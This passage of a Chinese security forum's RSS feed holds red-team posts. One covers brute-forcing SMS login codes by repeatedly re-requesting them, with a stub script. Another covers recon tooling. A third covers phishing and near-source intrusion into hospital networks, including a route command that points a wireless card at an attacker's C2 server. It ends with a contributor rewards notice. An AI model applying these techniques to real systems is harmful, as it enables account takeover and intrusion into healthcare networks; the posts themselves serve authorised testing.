&lt;p&gt;Socks代理和HTTP代理均可。那么能实现突破隔离的架构如图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970341-850457-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h5&gt;终端管理软件突破&lt;/h5&gt;

&lt;p&gt;无惧厂商终端管理软件，其实在一定程度上，厂家的终端管理软件对于我们近源操作造成的影响确实很大，但是在这种模式下，设备的接入，是可以突破终端管理软件的，终端管理软件的配置如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970361-843772-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;策略配置，限制出网，监测到出网即断网&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970374-789304-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;禁用双网卡&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970392-878175-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;U盘管控策略，禁用U盘&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-03-03/1740970407-243786-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;当策略启用的时候，外网穿透隧道依旧正常且设备的管理口映射后依旧可以使用。&lt;/p&gt;

&lt;h3&gt;总结&lt;/h3&gt;
&lt;p&gt;年前的一个项目中，接入了设备的使用，使用效果非常不错，在一定程度上可以满足各种隔离的网络，在实战中不用考虑突破边界的难度，横向的话考虑规避流量即可。&lt;/p&gt;



</description><link>https://zone.huoxian.cn/d/2977</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2977</guid><pubDate>Mon, 03 Mar 2025 02:55:41 GMT</pubDate><author>和</author><category>原创文章</category><category>redteam</category><category>AIOT安全</category></item><item><title>【挖洞之旅】一种验证码爆破漏洞的全新思路 | 简单实用</title><description>&lt;p&gt;​		以往，遇到验证码，测试爆破都是重发几次，如果有次数限制大家就不会继续挖了，其实还有个方法可以尝试，我已经通过这个方法得到不少赏金，希望思路对大家有用。&lt;/p&gt;

&lt;p&gt;验证码认证分为两个步骤：&lt;/p&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;请求验证码&lt;/li&gt;
&lt;li&gt;校验验证码&lt;/li&gt;&lt;/ol&gt;

&lt;p&gt;​		一般常见的验证码爆破就是在第二个校验阶段进行的，一般防护都会对校验次数进行验证，错误一定次数后验证码失效（tips：有时候它显示失效了，实际上还是可以用的 🤣 ）&lt;/p&gt;

&lt;p&gt;其实还有一种新姿势，不说想到的人不多，但是一说出来你立刻就懂了。&lt;/p&gt;

&lt;h3&gt;姿势&lt;/h3&gt;

&lt;p&gt;​	方法很简单，如果步骤二的校验存在次数限制，此时我们只需要重新发一次验证码就可以再次进行爆破了。你肯定会想“验证码不会更新吗？更新了你还怎么爆破！”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739951524-480960-fd277457-5a69-4866-bc5b-5667008a606a.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;​	其实这个不重要！说是验证码爆破，其实叫验证码碰撞更贴切一点。整体思路就是固定几个验证码，校验验证码可以有几次机会就固定几个，然后不断自动生成验证码，只要生成的验证码正巧中了你固定的那几个验证码，你就成功了。&lt;br&gt;
利用这个方法的核心就是请求验证码，这个需要发送验证码时没有人机验证，或者能绕过人机验证（绕过这个就看大佬们自己的各种神通了），所以能使用这个方法的时候，一般都会有伴生漏洞（定向短信轰炸、横向短信轰炸）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739952110-969608-84f6020a-d625-4ed3-bc2c-2c5c4cdd4fe8.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;​	我们计算一下效率，4位数的验证码，有10000种组合，假设每个验证码可以碰撞5次，那么成功率就是5/10000=0.0005，也就是0.05%，平均需要碰撞1/0.05%=2000次，不看网络卡顿的情况，大概也就2000秒，也就是2000/60=33.333333，半个小时作用。实际上一般会比这个快，经过我的多次成功平均时间来看，平均20分钟左右都可以成功。脸超级无敌黑的话就没办法了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739952692-501379-521c1cd7-43c5-4d9d-979f-436a9855b2af.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;​	这个方法可以根据实际情况进行自己优化，比如限制每个手机号发送时间1分钟的话，可以准备70个手机号码，循环发送，或者多线程同时给多个手机号发送验证码，同时校验，可以大大增加成功率，减少碰撞时间，还有很多优化方法大佬们肯定比我懂得多，嘿嘿。&lt;/p&gt;

&lt;h3&gt;实战案例&lt;/h3&gt;

&lt;p&gt;​	下面上一个我的实战案例：&lt;/p&gt;

&lt;p&gt;​	某超市的项目，验证码登录逻辑有缺陷，可导致所有通过该方式验证登录的系统受到影响，通过横向爆破的方式登录系统。&lt;/p&gt;

&lt;p&gt;​	通过抓包分析发现该系统的验证码为4位，且每次可以尝试验证码5次，每个IP每天限制发送验证码50+次，且无人机校验机制，因此可以直接通过脚本进行爆破。这个系统的验证阶段不是直接验证手机号和验证码的，而是第一步骤每个手机号发送验证码后会返回一个不同auth_code值，通过这个auth_code值和验证码来进行匹配校验。&lt;/p&gt;

&lt;p&gt;​	脚本逻辑大致如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954686-925824-97bb1287-711d-44b5-a863-15e9768b666f.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;​	准备大量手机号，分成50个一组，同时对50个手机号发送验证码，获得50个对应的auth_code，然后再对50个auth_code进行第1个验证码尝试，失败了再对下一个验证码尝试，每次可以同时验证50个验证码提高了效率。5次机会用完再切换IP，对下一组手机号发起验证码。以此类推。&lt;/p&gt;

&lt;p&gt;​	成功的概率：4位数验证码有10000种组合，每个手机号可以尝试5次，也就是5/10000&lt;em&gt;100=0.05%，然后每一轮可以测试50个手机号，每轮成功的概率为0.05&lt;/em&gt;50=2.5%。这碰撞成功的概率还是挺高的（因为有IP限制，所以我用了地址池，实际大家可以根据实际情况自己更新优化步骤）。&lt;/p&gt;

&lt;p&gt;具体步骤如下：&lt;/p&gt;

&lt;p&gt;首先正常获取验证码抓包，然后随机输入验证码也抓包&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739953425-248937-41a48045-904f-4d18-9fca-0579bc0d0f37.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;数据包没存，就不放图了，大佬能理解意思就行了&lt;/p&gt;

&lt;p&gt;使用自己熟悉的脚本语言编写,主要就是两个函数，一个是多线程发送验证码，一个是多线程校验验证码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-PYTHON&quot;&gt;# 快速并发请求
def sent_code(http_raw, data_list: list):
    # 并发获取返回协程列表
    ...
    return result_list

# 快速并发请求
def sent_code1(http_raw, data_list: list):
    # 并发获取返回协程列表
    ...
    return is_success&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;附上一张成功截图，不到20分钟成功两次&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954149-36939-a60e8703-2154-45c3-8e83-94b0e97b2ab2.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;最后任意验证码登录，替换返回包即可登入系统&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954282-16206-60bd35b4-a8fb-4c4b-afba-7b39a76bf384.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954448-629295-049f6942-e24e-4c69-860c-6fea761e09c4.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h3&gt;最后的话&lt;/h3&gt;

&lt;p&gt;这个姿势技术性不强，核心还是思路，感觉有用的给我点点赞，祝看官师傅天天高危不重复，嘿嘿嘿&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-02-19/1739954931-51503-ea755c60-dc54-4c50-8d9c-035c7b54df46.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
</description><link>https://zone.huoxian.cn/d/2975</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2975</guid><pubDate>Wed, 19 Feb 2025 08:57:39 GMT</pubDate><author>cc55y</author><category>原创文章</category><category>挖洞姿势</category><category>实战攻防</category></item><item><title>红队攻防中HW的一些艺术</title><description>&lt;h2&gt;0x1 攻防的研究思考&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-Markdown&quot;&gt;渗透的本质是信息收集，攻防的体系是知识点的串联。&lt;/code&gt;&lt;/pre&gt;


&lt;h4&gt;进入内网，需要注意的东西：&lt;/h4&gt;

&lt;p&gt;1、网段&lt;/p&gt;

&lt;p&gt;网段可以让我们确定往哪里打，看他是什么网段，再去怎么进行一个横向&lt;/p&gt;

&lt;p&gt;2、密码&lt;/p&gt;

&lt;p&gt;通过账号密码，合法进入&lt;/p&gt;



&lt;h4&gt;&lt;strong&gt;ATT&amp;amp;CK&lt;/strong&gt;框架&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-Markdown&quot;&gt;侦察（企业、ICS）
资源开发（企业、ICS）
初始访问
执行
坚持不懈
权限升级
防御回避
凭证访问（企业、移动）
发现
横向运动
收藏品
指挥与控制
渗透（企业、移动）
影响 
网络效应（仅限手机）
网络服务效果（仅限手机）
抑制响应功能（仅限 ICS）
损害过程控制（仅限 ICS）&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;参考文档：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/14149&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://xz.aliyun.com/t/14149&lt;/a&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;MITRE ATT&amp;amp;CK&lt;/strong&gt;，全称是&lt;code&gt;MITRE Adversarial Tactics Techniques and Common Knowledge&lt;/code&gt;，即&lt;strong&gt;入侵者战术、技术和共有知识库&lt;/strong&gt;，是以&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E9%A7%AD%E5%AE%A2&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;骇客&lt;/a&gt;的视角，针对&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E6%94%BB%E6%93%8A&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;网络攻击&lt;/a&gt;入侵进行分类和说明的指南，由非营利组织MITRE所创建。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;MITRE&lt;/strong&gt;：&lt;a href=&quot;https://www.mitre.org/&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://www.mitre.org/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;MITRE（The MITRE Corporation）是一家&lt;strong&gt;非营利性的美国研究和技术组织&lt;/strong&gt;，成立于1958年，最初从麻省理工学院林肯实验室分离出来。该组织在众多关键领域为美国政府提供系统工程、研究开发和信息技术支持服务，尤其以网络安全、国防技术、航空系统、医疗保健、生物识别技术和公共政策分析等方面的研究与应用闻名。&lt;/p&gt;



&lt;h4&gt;&lt;strong&gt;网络杀伤链&lt;/strong&gt;&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-Markdown&quot;&gt;网络杀手链的 7 个阶段：
侦察
武器化
送货
剥削
安装
指挥与控制
目标行动&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&quot;https://www.blackberry.com/cn/zh/solutions/endpoint-security/mitre-attack/mitre-attack-vs-cyber-kill-chain&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://www.blackberry.com/cn/zh/solutions/endpoint-security/mitre-attack/mitre-attack-vs-cyber-kill-chain&lt;/a&gt;&lt;/p&gt;


&lt;h2&gt;0x2 打点的艺术&lt;/h2&gt;

&lt;h3&gt;1、对靶标分析&lt;/h3&gt;

&lt;p&gt;在 HW 当中，获取到的靶标存在多种行业。对不同的靶标存在不同的打法，我通常分为两个大方向。其一为机关单位，其二为集团公司等。&lt;/p&gt;



&lt;p&gt;其中二者区别对攻击者而言，就是资产的散落程度。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;地级市的机关单位&lt;/code&gt;通常将网站托管在政务云，大数据等。这意味着，通常两三个的 C 段部署着当地大量的机关单位网站集群。&lt;/p&gt;

&lt;p&gt;而&lt;code&gt;集团公司&lt;/code&gt;等靶标应当采取“老式” 的打点方式，所以接下来对两种打的方式进行打法剖析。&lt;/p&gt;



&lt;h3&gt;2、工具的使用&lt;/h3&gt;

&lt;p&gt;对于&lt;code&gt;机关单位&lt;/code&gt;的打法，因为其资产通常散落在多个大的 C 段当中，所以首要的目标就是对其 C 段权重的寻找。切入点应该选择手中的靶标为机关单位的目标，以此为点。&lt;/p&gt;  



&lt;p&gt;棱眼: &lt;a href=&quot;https://github.com/EdgeSecurityTeam/Eeyes&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/EdgeSecurityTeam/Eeyes&lt;/a&gt;&lt;/p&gt;  

&lt;p&gt;对目标的子域对应 IP 进行 C 段权重的判断&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Eeyes(棱眼)&lt;/strong&gt;是之前写的工具，旨在获取到大量域名之后，获取其中真实IP并整理成c段，有助于在src中或红蓝攻防中快速定位目标的真实资产，可结合棱洞使用，识别cdn的准确率是网络环境决定的。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-Markdown&quot;&gt;     ______    __         ______
    / ____/___/ /___ ____/_  __/__  ____ _____ ___
   / __/ / __  / __ `/ _ \/ / / _ \/ __ `/ __ `__ \
  / /___/ /_/ / /_/ /  __/ / /  __/ /_/ / / / / / /
 /_____/\__,_/\__, /\___/_/  \___/\__,_/_/ /_/ /_/
       /____/ https://forum.ywhack.com  By:shihuang

Eeyes version: 0.0.1
Usage: Eeyes [-f|-l] [parameter]

Options:
  -f string
      Fofa searches for assets , supports domain。(example.com)
  -ftime string
      fofa timeout (default &quot;10&quot;)
  -h  this help
  -l string
      Probe based on local file
  -log string
      Log file name (default &quot;server.log&quot;)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-10/1736477469-626340-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;EHole(棱洞) 红队重点攻击系统指纹探测工具&lt;/p&gt;

&lt;p&gt;使用确定EHole(棱洞) 来确定 C 段的权重是否正确，进行C段的资产梳理&lt;/p&gt;

&lt;p&gt;EHole是一款对资产中重点系统指纹识别的工具，在红队作战中，信息收集是必不可少的环节，如何才能从大量的资产中提取有用的系统(如OA、VPN、Weblogic...)。EHole旨在帮助红队人员在信息收集期间能够快速从C段、大量杂乱的资产中精准定位到易被攻击的系统，从而实施进一步攻击。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-10/1736477486-234869-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;h3&gt;3、打法汇总&lt;/h3&gt;

&lt;p&gt;1、如 React，Vue，AngularJS 的 XSS 问题？ （使用这几个框架搭建的系统都进行了预编译，XSS语句不会被执行）&lt;/p&gt;

&lt;p&gt;jquery // vue {{var}}. v-html=var&lt;/p&gt;



&lt;p&gt;2、springboot 不解析 jsp 马的问题？（不需要测试文件上传getshell）&lt;/p&gt;

&lt;p&gt;tomcat-jsper.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/lovlife/articles/12766362.html&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/lovlife/articles/12766362.html&lt;/a&gt;&lt;/p&gt;



&lt;p&gt;3、fofa 的资产打开 404 真的是关站了嘛？ 扫端口&lt;/p&gt;



&lt;p&gt;直接从fofa打开网站，带了fofa的referer头，直接被拦截了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-10/1736477552-635845-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;4、对目标技术栈 springcloud 分布式，k8s 云新架构的入手点问题 (软柿子捏的问题) 等等，框架的演变讲解：&lt;/p&gt;

&lt;p&gt;jsp/servlet. ==&amp;gt; ssh hiberna,spring,struts2. &amp;gt; ssm mybatis,spring,springmvc &amp;gt; springboot ssm 约定大于配置 =&amp;gt; 前后端分离 json ajax 前端和 后端分开来部署 ====&amp;gt; springcloud. 分布式。&lt;/p&gt;



&lt;h3&gt;4、Goby 和 Xray 的结合使用&lt;/h3&gt;

&lt;p&gt;HW 前通常会准备七八台云服务器，部署 Xray 和 Goby，将信息搜集到的资产经过 Goby 的全端口扫描 之后导出 web 服务转入&lt;/p&gt;  

&lt;p&gt;Xray 和 Rad 的批量扫描。例如机关单位的几个 C 段进行 Goby 全端口扫描&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-10/1736477592-371822-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;导入服务器到goby操作：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/FY10033/article/details/124581536&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/FY10033/article/details/124581536&lt;/a&gt;&lt;/p&gt;
















</description><link>https://zone.huoxian.cn/d/2969-hw</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2969-hw</guid><pubDate>Fri, 10 Jan 2025 02:54:22 GMT</pubDate><author>routing</author><category>应用安全</category><category>挖洞姿势</category><category>实战攻防</category><category>信息收集</category></item><item><title>谈一谈红队种的钓鱼姿势（下）</title><description>&lt;h3&gt;序&lt;/h3&gt;

&lt;p&gt;因为系列已发，所以就画个句号吧，最后一篇文了，src见过定级扯皮的，没想到投稿评审也得扯皮【笑哭】，所有示意图均为自画，禁止盗图呦，ahhh&lt;/p&gt;

&lt;h3&gt;前言&lt;/h3&gt;

&lt;p&gt;前面提到了JY和ZW，那么这里主要聊聊YL行业，YL单独拿出来说，主要是因为YL行业的可玩性最高，并且YL的网络环境目前基本上大体上各个医院基本类似，安全意识高一点儿和预算稍微充足一点儿的医院从网络架构上来说基本上都已经都做到了一致，在省级市级的行动中医院的参与度是比较高的，更高级别的行动种针对的就是整个卫生行业了。&lt;/p&gt;

&lt;h3&gt;YL行业目前的基本情况&lt;/h3&gt;

&lt;p&gt;这里拿我接触到的看到的来简单聊聊，只谈我接触到的，基本上各家医各地卫生行业基本类似，目前国内的大多数的二级医院分布在县级单位，网络安全投资一般不会很大，从网络安全设备上来讲基本上大多数有防火墙、IPS、IDS，IPS和IDS有的甚至是新一代防火墙的模块，WAF部分可能存在，流量探针和态势感知平台大部分是没有的且核心业务网和互联网区是没有做物理隔离的。&lt;/p&gt;

&lt;h5&gt;二级无网闸&lt;/h5&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736242910-7423-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;安全运维预算稍微足一点儿的，基本上会增加堡垒机和漏扫设备，并且划分的有单独的安全运维区&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736242922-153926-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;但是针对YL行业，针对上部最大的问题就是互联网和核心业务内网没有物理隔离，互联网区很业务内网没有实质上的网络隔离，那么两个区域之间的划分没有任何意义。针对这两种的网络架构，实际上的钓鱼就非常简单了。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;钓鱼目标选择任意内网区域内的终端准可实现从终端到业务内网和医保网的网络通信。这种情况一般网关是做在了核心交换机上。&lt;/li&gt;
&lt;li&gt;也可以近缘采用WiFi破解实现突破边界隔离。&lt;/li&gt;&lt;/ul&gt;

&lt;h5&gt;二级网闸架构&lt;/h5&gt;

&lt;p&gt;利用网闸实现隔离，互联网区仅做访问外网，业务内网服务器均不可出网，仅做核心业务应用访问，例如HIS、LIS等的终端基本全部在业务内网区域。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736242935-695326-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这种情况下并非所有的业务网终端都是不能出网的，类似于三级业务系统，是存在部分运维终端以及主任终端是可以出网的，包括财务以及前置机服务器等都是会出网的。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;供应链钓鱼运维机，这种情况下可以不针对医院内职工进行重点信息搜集&lt;/li&gt;
&lt;li&gt;钓鱼双网卡机，基本上各个部门主任的机器都是双网卡机，二级三级医院同样适用。&lt;/li&gt;&lt;/ul&gt;

&lt;h5&gt;三级网闸&lt;/h5&gt;

&lt;p&gt;安全运维做的比较优秀的单位会增加更多的安全设备，比如增加EDR对终端安全进行监测管控，上网行为管理设备部分单位会有，主要一般是考虑舆情方面的问题，另一个是全流量分析平台监测以及态势感知。最重要的一点儿是准入设备的接入让近源攻击的难度也大大增加。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736242955-900043-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;二三级级的YL网络还是可以利用近源接入，或者近源攻击突破边界，目前实战种我通常从两个层面出发，第一个是利用无线网，对于YL系统来说也是存在无线内网的，无线内网登录会自动获取内网IP地址，部分业务是可以访问的。第二个还是需要利用内网业务终端进行跳板，但是不出网的情况不是没有办法解决，是完全可以有办法解决的。不过目前分为两种情况&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;无&lt;strong&gt;DeviceLock&lt;/strong&gt;软件&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;没有USB禁用等工具软件，可以配合无线网卡进行使用。在近源终端上增加无线网卡做默认路由，指向自己的C2服务器，这种情况下，业务网终端担任的角色就是双网卡。利用出网网卡进行跳板，内网网卡进行业务链接&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736242970-717525-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;默认路由命令&lt;/p&gt;

&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;route add XX.XX.XX.XX mask 255.255.255.255 192.168.0.1 metric 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736242987-560419-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这种情况下，稳定的隧道是没有问题的，也不会影响业务，除非业务网段和无线网卡的网段一致，至于规避流量监测那是另一个技术层面的问题了。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;存在&lt;strong&gt;DeviceLock&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;部分三级单位是存在usb禁用工具的，也卸不掉同样无法退出，这种情况下上面的方式近源也是解决不了问题的，第一渗透工具无法上传，第二也无法出网没有稳定的隧道。这种情况下就比较原始了。&lt;/p&gt;

&lt;p&gt;利用网线直连实现工具FTP传输&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736243001-592631-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这种情况是可以上传成功工具进行操作的。但是最大的问题是没有隧道，无法远程操作。这种情况下可以提供一点儿思路。如果A和内网终端直连，A出网即可实现隧道传输。那么问题就解决了，不通过直连FTP，需要接入一个出网的机器。示意图如下所示&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-07/1736243018-932522-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h4&gt;小结&lt;/h4&gt;

&lt;p&gt;这两年这集中攻击方案在行动中屡试不爽，目前也没碰见比三级网闸更复杂的情况，在规则允许的情况下，事实上YL行业我倒觉得是众多行业内还算比较容易出成果的，钓鱼其实还好，社工以及近源最大的问题就是“偷感”太重，欢迎交流，有碰撞才有新思路。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2967</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2967</guid><pubDate>Tue, 07 Jan 2025 09:44:45 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>火线Zone 24年11月、12月技术文章奖励公示</title><description>&lt;p&gt;亲爱的火线Zone社区成员们，&lt;/p&gt;

&lt;p&gt;自火线Zone征稿奖励方案启动以来，我们收到了众多技术专家的杰出投稿。这些高质量的原创技术文章不仅丰富了我们的社区知识库，也极大地促进了安全技术的交流与分享。在此，我们对所有积极参与的创作者表示衷心的感谢，并希望激励更多的技术专家加入我们的行列，共同推动技术安全生态的繁荣发展。&lt;/p&gt;

&lt;h3&gt;优秀文章奖&lt;/h3&gt;

&lt;p&gt;经过严格的审核流程，以下文章凭借其深度分析和独到见解，荣获“优秀文章奖”，各获得&lt;strong&gt;50查克拉积分 + 500RMB&lt;/strong&gt;的奖励：&lt;/p&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2960-hvv/5&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;近期某省级HVV实战回忆录&lt;/a&gt;&lt;/strong&gt; 作者：和&lt;/li&gt;&lt;/ol&gt;

&lt;h3&gt;基础投稿奖&lt;/h3&gt;

&lt;p&gt;以下文章也通过了我们的审核，符合基础投稿奖励要求，每位作者将获得&lt;strong&gt;50查克拉积分&lt;/strong&gt;的奖励：&lt;/p&gt;

&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2961-ndayprojectsend-cve-2024-11680&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;【Nday漏洞分析】ProjectSend 身份认证绕过漏洞(CVE-2024-11680)&lt;/a&gt;&lt;/strong&gt; 作者：jylove&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2963/2&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;分享最近一次渗透测试岗位面试经验&lt;/a&gt;&lt;/strong&gt; 作者：looklook&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://zone.huoxian.cn/d/2964&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;谈一谈红队中的社工钓鱼姿势(上)&lt;/a&gt;&lt;/strong&gt; 作者：和&lt;/li&gt;&lt;/ol&gt;

&lt;h3&gt;奖励发放说明&lt;/h3&gt;

&lt;ul&gt;&lt;li&gt;所有获得奖励的文章将同步发表在&lt;strong&gt;火线Zone&lt;/strong&gt;公众号上，以飨更广泛的读者群体。&lt;/li&gt;
&lt;li&gt;奖励将在每月的第一周统一发放，涵盖上月投稿的所有合格文章。请获奖者留意自己的火线安全平台账户。&lt;/li&gt;
